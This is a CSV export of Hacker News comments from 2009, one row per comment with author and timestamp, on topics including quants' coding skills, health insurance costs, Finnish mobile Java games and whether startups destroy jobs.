ID,Type,Story,Parent,Points,Comments,Author,Title,URL,Content,Created
558481,comment,558365,558430,0,0,tjake,,,"yeah, no tunes, and i just couldn't get used to the sweaty hands from the gloves. i forgot about the mask. those dark red lines in your face, i much prefer my aeron chair and office now :)",1239548377
558480,comment,557051,557715,0,0,tommorris,,,"I see a lot of that kind of writing: it's taught quite consistently to fine arts students, where it does actually have a use in persuading funding bodies to give money. If you say to a funding body ""We want to look at the relationship between human beings and anthropomorphic robots!"" you get nothing, but if you say ""We want to look at the relationship between place and space and internal subjectivity through [blah blah blah]"" you get money to build cool robots and let them loose on the park.<p>The only flaw with the plan is that this kind of stuff leaks out of that confine and infects discourse outside of art funding bodies.",1239548200
558479,comment,558439,558439,0,0,3pt14159,,,"The one about smiling is soooo true. Same with laughter. Has to be real, but it really does help.",1239548126
558478,comment,558427,558456,0,0,alyx,,,"Just because those ""objective"" answers are satisfactory for you does not imply that they are for everybody.<p>Unless of course you consider yourself to be average. And thus expect your opinions and thoughts to be similar to those of the masses.<p>I never understand people's problem with the core ideas of religion. So long as nobody tries to convert me, I'm really happy to accept other people's beliefs.",1239548013
558477,comment,558412,558462,0,0,Rod,,,"<i>""at most financial firms, the quants are strong mathematicians but third-rate coders.""</i><p>Truer words have never been written. Various friends of mine who are former mathematicians / physicists now working as quants do rock at stochastic calculus, but suck at C++. Maybe a solution would be to separate the coding tasks from the modeling tasks. A friend of mine recently took a quant position at a hedge fund, and while he gets to do a lot of modeling and data analysis, the actual implementation is carried out by a 1st rate coder with whom he works in tandem. That sounds very smart to me...",1239547833
558476,comment,199651,199683,0,0,paul_houle,,,"Maybe it's the state I'm in,  but whenever I've looked into high deductible plans it doesn't seem that they save much money.<p>Most of health insurance premiums go to pay for very expensive treatments,  usually at the end of life.  Routine medical bills don't add up to much:  but bills can add up to $250k pretty quick if you get cancer.",1239547827
558475,comment,558365,558365,0,0,cool-RR,,,"Not coding, but editing video. It was for a start-up I founded, and it happened 2.5 years ago. I just moved into a new apartment and had little besides my Pentium III computer and an approaching deadline. It had a bad-quality 14-inch CRT screen that I salvaged from somewhere. I mounted the screen on the computer case, sat on the floor with keyboard on my folded legs, and started working.",1239547791
558474,comment,557452,558223,0,0,sho,,,"I thought that was strange too. But even more strange is his job description: ""researches the acceleration of human evolution since the advent of agriculture"".<p>Acceleration? I was under the impression that once the food problem was solved, evolution slowed dramatically. In fact I thought it had basically stopped thousands of years ago, apart from obvious things like ""impotence is selected against"", or ""luxury evolution"" like selecting against extreme ugliness.<p>It makes no sense. Tools and farming remove selection pressure <i>per se</i>, and if that's gone we just stay as we are, not slowly ""revert"", or whatever he's imagining.",1239547738
558473,comment,558364,558416,0,0,pavlov,,,"Indeed. There's no shortage of success stories in mobile development before Apple or Google came along, but they mostly took place a long way from Silicon Valley.<p>In 2004, I was working as a graphics artist for a Finnish startup that was in the business of making Java games for phones. The company had started with three founders two years earlier, and when I got there, they employed over 30 people and kept growing. They had struck deals with operators across Europe, and game sales were taking off in a serious way. (Ordinary people were buying millions of units of over-the-air distributed Java software for phones already in 2004 -- but I guess those that were successful in this market were not terribly interested in attracting competitors by making a lot of noise about it.)<p>The games were good enough that everybody could be proud of the work. On the best phones, the graphics and sound quality was on the level of Amiga or 386+VGA PCs. But more importantly, the games scaled down graciously to the most primitive color-screen phones with resolutions circa 128*80 pixels: thanks to a well-thought out set of APIs, an asset workflow designed for scalability and an extensive database of device capabilities, games could be easily built for dozens of devices.<p>I ended up leaving that job fairly quickly because I figured out I'd rather be pushing around millions of pixels on the GPU with code, rather than pushing around individual pixels in Photoshop manually. But I know the company was acquired by a large American corporation not long after, and I think the founders ended up very well rewarded for having created that rare combination of technical competence (the APIs and development process), marketing (the relationships with international operators) and artistic integrity (the games looked good and played well).",1239547709
558472,comment,558428,558428,0,0,yummyfajitas,,,"This essay is internally contradictory.<p>""Startups often make money primarily by reducing costs, and cost reduction nearly always means job reduction.""<p>""If a company hires an employee whose efforts earn the company three times their salary, that gives said company the cash flow to hire two more people.""<p>So basically, creating www.replace-your-secretary-with-web-2point0-technology.com and selling subscriptions destroys jobs. Probably true. But writing replacethesecretarywithvisualbasic.exe for a salary creates them?<p>The only real difference I see is that a startup will (hopefully) have a bigger impact.",1239547633
